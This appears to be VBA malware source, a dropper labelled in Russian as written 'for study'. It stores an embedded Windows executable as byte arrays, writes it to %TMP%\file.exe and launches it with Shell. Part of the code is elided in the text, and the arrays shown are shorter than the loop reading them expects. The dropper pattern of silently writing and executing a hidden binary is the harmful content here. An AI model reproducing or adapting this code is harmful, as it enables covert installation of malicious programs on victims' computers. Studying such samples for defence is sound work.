
//Написан с целью изучения by CYBER BASTARD

Private a(864) As Variant

Private Sub Init0()
    a(1) = Array(77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0)
    a(2) = Array(136, 190, 95, 48, 204, 223, 49, 99, 204)
    a(3) = Array(11, 1, 6, 0, 0, 32, 1, 0, 0, 112, 0, 0)
    a(4) = Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    a(5) = Array(0, 0, 0, 0, 32, 0, 0, 96, 46, 114, 100)

[...]

    fnum = FreeFile
    fname = Environ("TMP") & "\file.exe"
    Open fname For Binary As #fnum
    For i = 1 To 864
        For j = 0 To 127
            aa = a(i)(j)
            Put #fnum, , aa
        Next j
    Next i 
    Close #fnum
    Dim rss
    rss = Shell(fname, 1)
End Sub